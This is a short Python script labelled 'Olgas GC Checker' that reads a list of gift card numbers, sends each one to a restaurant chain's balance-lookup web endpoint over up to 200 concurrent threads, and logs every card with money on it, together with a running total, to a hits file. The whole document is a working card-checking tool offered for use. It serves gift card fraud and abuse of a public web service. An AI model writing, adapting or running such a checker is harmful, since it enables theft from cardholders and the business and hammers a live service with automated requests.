#import modules and set some things
import requests, threading, time, getpass, ctypes
from decimal import Decimal, DecimalException
startTime = time.time()
f2 = open('hits.txt', 'w')
total = '0.00'
hit = 0

#check the codes now
def check(card):
   global hit
   global total
   url = 'https://www.olgas.com/getGiftCardBalance.php'
   apiSender = requests.session()
   source = (apiSender.post(url, data={'cardNumber': card})).text
   if source != '$0.00':
       print(card + ' | ' + source)
       balance = source[1:]
       total = float(total)
       total = float(balance) + total
       hit += 1
       f2.write(card + ' | ' + source + '\n')
       ctypes.windll.kernel32.SetConsoleTitleW(f'''Olgas GC Checker | By Pured | Hits: {hit} | Total price of all cards: ${(str(round(total, 2)))}''')

#open the codes and do some threading
f1 = open('codes.txt', 'r')
for line in f1:
   t1 = threading.Thread(target=check, args=(line.strip(),))
   while threading.active_count() > 200:
       time.sleep(3)

   t1.start()

t1.join()
time.sleep(3)
#when checking is done
print(f'''
Finished!
Hits: {hit} | Total money: ${(str(round(total, 2)))} | Time elapsed: {(str(round(time.time() - startTime, 2)))}s''')
f1.close()
f2.close()
getpass.getpass(prompt='')
